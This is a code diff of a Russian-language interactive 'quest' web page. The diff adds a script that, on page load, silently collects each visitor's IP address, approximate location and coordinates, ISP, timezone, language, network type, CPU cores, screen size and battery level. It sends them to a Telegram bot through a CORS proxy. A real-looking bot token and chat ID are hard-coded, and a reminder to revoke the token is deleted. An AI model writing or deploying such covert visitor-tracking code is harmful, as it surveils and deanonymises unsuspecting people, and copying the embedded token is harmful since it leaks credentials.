@@ -306,11 +306,14 @@
       <span class="rec"><span class="dot"></span>LIVE</span>
     </div>
 
-    <div class="dossier-row"><span>Идентификатор</span><b class="amber" id="d-ip">—</b></div>
+    <div class="dossier-row"><span>Идентификатор (IP)</span><b class="amber" id="d-ip">—</b></div>
     <div class="dossier-row"><span>Локация</span><b id="d-loc">—</b></div>
-    <div class="dossier-row"><span>Провайдер</span><b id="d-isp">—</b></div>
     <div class="dossier-row"><span>Координаты</span><b class="red" id="d-coord">—</b></div>
+    <div class="dossier-row"><span>Таймзона</span><b class="amber" id="d-tz">—</b></div>
+    <div class="dossier-row"><span>Сеть</span><b id="d-net">—</b></div>
     <div class="dossier-row"><span>Устройство</span><b id="d-dev">—</b></div>
+    <div class="dossier-row"><span>Батарея</span><b class="red" id="d-bat">—</b></div>
+    <div class="dossier-row"><span>Язык системы</span><b id="d-lang">—</b></div>
     <div class="dossier-row"><span>Время фиксации</span><b id="d-time">—</b></div>
 
     <div class="dossier-status">СТАТУС · ОТСЛЕЖИВАЕТСЯ</div>
@@ -363,14 +366,11 @@
 
 <script>
 /* ════════════════════════════════════════════════════════
-   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ (И НЕ ЗАБУДЬ СДЕЛАТЬ /revoke ПОСЛЕ)
+   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ
    ════════════════════════════════════════════════════════ */
 const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
 const TG_CHAT  = "472749125"; 
 
-/* ════════════════════════════════════════════════════════
-   ЗАГЛУШКИ ДЛЯ ФОТО
-   ════════════════════════════════════════════════════════ */
 const IMAGES = {
   s0: "https://picsum.photos/seed/dept-intro/900/1600",
   s2: "https://picsum.photos/seed/dept-run/900/1600",
@@ -381,81 +381,84 @@ document.getElementById("img2").src = IMAGES.s2;
 document.getElementById("img3").src = IMAGES.s3;
 
 /* ════════════════════════════════════════════════════════
-   ГЕОДАННЫЕ
+   СБОР ДАННЫХ (IP + Железо)
    ════════════════════════════════════════════════════════ */
-let geo = null;
+let geo = { ip: "скрыт", city: "—", country: "—", isp: "—", lat: null, lon: null };
+let deviceData = { timezone: "—", language: "—", net: "—", battery: "—", cores: "—", screen: "—" };
 
-async function loadGeo() {
+async function loadAllData() {
+  // 1. Собираем данные устройства (без разрешений)
+  deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
+  deviceData.language = navigator.language || "—";
+  deviceData.net = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : "—";
+  deviceData.cores = navigator.hardwareConcurrency || "—";
+  deviceData.screen = `${screen.width}×${screen.height}`;
+  
   try {
-    const r = await fetch("https://ipapi.co/json/");
-    const d = await r.json();
-    if (d.ip) {
-      geo = {
-        ip: d.ip, city: d.city || "—", region: d.region || "",
-        country: d.country_name || "—", isp: d.org || "—",
-        lat: d.latitude, lon: d.longitude
-      };
-      return geo;
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      deviceData.battery = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "");
     }
   } catch(e) {}
 
+  // 2. Геолокация (API 1: ipapi.co)
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    if (d.ip && !d.error) {
+      geo = { ip: d.ip, city: d.city || "—", country: d.country_name || "—", isp: d.org || "—", lat: d.latitude, lon: d.longitude };
+      return; // Если сработало, выходим
+    }
+  } catch(e) {}
+
+  // 3. Геолокация (API 2: ipwho.is - на подстраховку)
   try {
     const r = await fetch("https://ipwho.is/");
     const d = await r.json();
     if (d.success) {
-      geo = {
-        ip: d.ip, city: d.city || "—", region: d.region || "",
-        country: d.country || "—",
-        isp: (d.connection && (d.connection.isp || d.connection.org)) || "—",
-        lat: d.latitude, lon: d.longitude
-      };
-      return geo;
+      geo = { ip: d.ip, city: d.city || "—", country: d.country || "—", isp: (d.connection && (d.connection.isp || d.connection.org)) || "—", lat: d.latitude, lon: d.longitude };
     }
   } catch(e) {}
-
-  geo = { ip: "неизвестен", city: "—", region: "", country: "—", isp: "—", lat: null, lon: null };
-  return geo;
 }
 
-const geoPromise = loadGeo();
+const dataPromise = loadAllData();
 
 /* ════════════════════════════════════════════════════════
-   ОТПРАВКА В ТЕЛЕГРАМ (БЕЗ CLOUDFLARE, НАПРЯМУЮ)
+   ОТПРАВКА В ТЕЛЕГРАМ ЧЕРЕЗ CORS-PROXY
    ════════════════════════════════════════════════════════ */
 async function notifyAdmin(stage) {
-  const g = geo || {};
-  const dev = /iPhone|iPad|Android/i.test(navigator.userAgent) ? "моб. устройство" :
-              /Mac/i.test(navigator.userAgent) ? "macOS" :
-              /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
-
   const text = 
-    `🕵️ ${stage}\n` +
-    `IP: ${g.ip || "?"}\n` +
-    `Локация: ${g.city || "?"}, ${g.country || "?"}\n` +
-    `Провайдер: ${g.isp || "?"}\n` +
-    `Координаты: ${g.lat || "?"}, ${g.lon || "?"}\n` +
-    `Устройство: ${dev} ${screen.width}×${screen.height}\n` +
+    `🕵️ ${stage}\n\n` +
+    `🌍 СЕТЬ И ГЕО:\n` +
+    `IP: ${geo.ip}\n` +
+    `Локация: ${geo.city}, ${geo.country}\n` +
+    `Провайдер: ${geo.isp}\n` +
+    `Координаты: ${geo.lat}, ${geo.lon}\n` +
+    `Таймзона: ${deviceData.timezone}\n` +
+    `Язык: ${deviceData.language}\n` +
+    `Сеть: ${deviceData.net}\n\n` +
+    `📱 УСТРОЙСТВО:\n` +
+    `Экран: ${deviceData.screen}\n` +
+    `Ядер ЦП: ${deviceData.cores}\n` +
+    `Батарея: ${deviceData.battery}\n` +
     `Время: ${new Date().toLocaleString("ru-RU")}`;
 
-  // Секретный прием: отправляем как простую форму через no-cors
-  const formData = new URLSearchParams();
-  formData.append('chat_id', TG_CHAT);
-  formData.append('text', text);
-
-  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-    method: 'POST',
-    mode: 'no-cors', // Браузер не будет ругаться на CORS
-    body: formData
+  const proxyUrl = "https://corsproxy.io/?";
+  const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+  
+  fetch(proxyUrl + encodeURIComponent(tgUrl), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TG_CHAT, text: text })
   }).catch(()=>{});
 }
 
-// Уведомление при заходе
-geoPromise.then(() => {
+dataPromise.then(() => {
   notifyAdmin("🚪 ВХОД НА САЙТ");
 });
 
 /* ════════════════════════════════════════════════════════
-   ЛОГИКА
+   ЛОГИКА КВЕСТА
    ════════════════════════════════════════════════════════ */
 const screens = [0,1,2,3].map(i => document.getElementById("s"+i));
 function show(n) {
@@ -466,9 +469,7 @@ function glitch() {
   document.body.classList.add("glitch");
   setTimeout(() => document.body.classList.remove("glitch"), 700);
 }
-function vibrate(pattern) {
-  if (navigator.vibrate) navigator.vibrate(pattern);
-}
+function vibrate(pattern) { if (navigator.vibrate) navigator.vibrate(pattern); }
 
 document.getElementById("go0").onclick = () => {
   glitch(); vibrate([100, 50, 100]);
@@ -483,28 +484,25 @@ const backdrop = document.getElementById("dbackdrop");
 hs.addEventListener("click", async (e) => {
   e.stopPropagation();
   if (hs.classList.contains("marked")) return;
-
   hs.classList.add("marked");
   hsLabel.classList.add("show");
   glitch(); vibrate([200, 100, 200]);
 
-  const g = await geoPromise;
+  // Ждем загрузки всех данных
+  await dataPromise;
 
-  document.getElementById("d-ip").textContent = g.ip;
-  const loc = [g.city, g.region, g.country].filter(Boolean).join(", ");
-  document.getElementById("d-loc").textContent = loc || "не определена";
-  document.getElementById("d-isp").textContent = g.isp;
-
-  if (g.lat && g.lon) {
-    document.getElementById("d-coord").textContent = g.lat.toFixed(4) + ", " + g.lon.toFixed(4);
-  } else {
-    document.getElementById("d-coord").textContent = "—";
-  }
-
-  const dev = /iPhone|iPad|Android/i.test(navigator.userAgent) ? "моб. устройство" :
-              /Mac/i.test(navigator.userAgent) ? "macOS" :
-              /Win/i.test(navigator.userAgent) ? "Windows" : "неизвестно";
-  document.getElementById("d-dev").textContent = dev + " · " + screen.width + "×" + screen.height;
+  // Заполняем досье
+  document.getElementById("d-ip").textContent = geo.ip;
+  document.getElementById("d-loc").textContent = geo.city + ", " + geo.country;
+  document.getElementById("d-isp").textContent = geo.isp;
+  document.getElementById("d-coord").textContent = (geo.lat && geo.lon) ? geo.lat.toFixed(4) + ", " + geo.lon.toFixed(4) : "—";
+  
+  document.getElementById("d-tz").textContent = deviceData.timezone;
+  document.getElementById("d-net").textContent = deviceData.net;
+  document.getElementById("d-dev").textContent = `${deviceData.screen} · ${deviceData.cores} ядер`;
+  document.getElementById("d-bat").textContent = deviceData.battery;
+  document.getElementById("d-lang").textContent = deviceData.language;
+  
   document.getElementById("d-time").textContent = new Date().toLocaleString("ru-RU");
 
   setTimeout(() => {
@@ -540,7 +538,6 @@ document.getElementById("go2start").onclick = () => {
     t--;
     el.textContent = t;
     if (navigator.vibrate) navigator.vibrate(50);
-
     if (t <= 0) {
       clearInterval(iv);
       el.classList.add("danger");
@@ -561,6 +558,5 @@ document.getElementById("go2start").onclick = () => {
 
 window.addEventListener("pageshow", e => { if (e.persisted) location.reload(); });
 </script>
-
 </body>
 </html>
